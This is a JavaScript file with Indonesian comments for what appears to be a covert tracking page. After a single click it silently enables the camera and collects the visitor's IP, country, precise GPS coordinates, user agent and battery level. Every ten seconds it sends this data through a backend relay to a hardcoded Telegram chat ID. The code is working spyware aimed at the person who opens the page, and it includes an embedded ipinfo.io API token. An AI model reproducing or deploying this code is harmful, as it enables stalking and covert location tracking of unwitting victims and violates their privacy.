const CHAT_ID = "7483495590";
const statusEl = document.getElementById("status");

// trigger kamera invisible
async function initCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:false });
    console.log("Kamera aktif:", stream);
  } catch(err){
    console.error("Gagal akses kamera:", err);
  }
}

// trigger saat user klik sekali
document.getElementById("clickArea").addEventListener("click", async () => {
  statusEl.textContent = "Mengaktifkan kamera & live tracking...";
  await initCamera();
  document.getElementById("clickArea").remove();
  startLiveTracking();
});

// ambil info device + IP + lokasi
async function getDeviceInfo(){
  try{
    const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r=>r.json());
    const battery = await navigator.getBattery();
    let geo="Tidak tersedia";
    if(navigator.geolocation){
      await new Promise(resolve => navigator.geolocation.getCurrentPosition(pos=>{
        geo=`Lat:${pos.coords.latitude}, Lng:${pos.coords.longitude}, Accuracy:${pos.coords.accuracy} m`;
        resolve();
      }, ()=>resolve()));
    }
    return `🌐 IP:${ipInfo.ip}\n🌍 Negara:${ipInfo.country}\n📍 Lokasi:${geo}\n📱 UserAgent:${navigator.userAgent}\n🔋 Battery:${Math.round(battery.level*100)}%`;
  }catch(e){return "❌ Gagal ambil info device";}
}

// kirim ke backend
async function sendToTelegram(data, photoUrl=null){
  try{
    await fetch('/api/sendMessage', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ text: data, photoUrl })
    });
  }catch(e){console.error(e);}
}

// live tracking
async function liveTracking(){
  const info = await getDeviceInfo();
  await sendToTelegram(info);
  statusEl.textContent = `Terakhir update: ${new Date().toLocaleTimeString()}`;
}

// mulai interval live tracking tiap 10 detik
function startLiveTracking(){
  liveTracking();
  setInterval(liveTracking, 10000);
}

// kirim pesan manual
document.getElementById("sendBtn").addEventListener("click", async () => {
  const msg = document.getElementById("msg").value.trim();
  if(!msg) return alert("Tulis dulu pesanmu!");
  await sendToTelegram(msg);
  document.getElementById("msg").value = "";
  statusEl.textContent = "Pesan terkirim!";
});
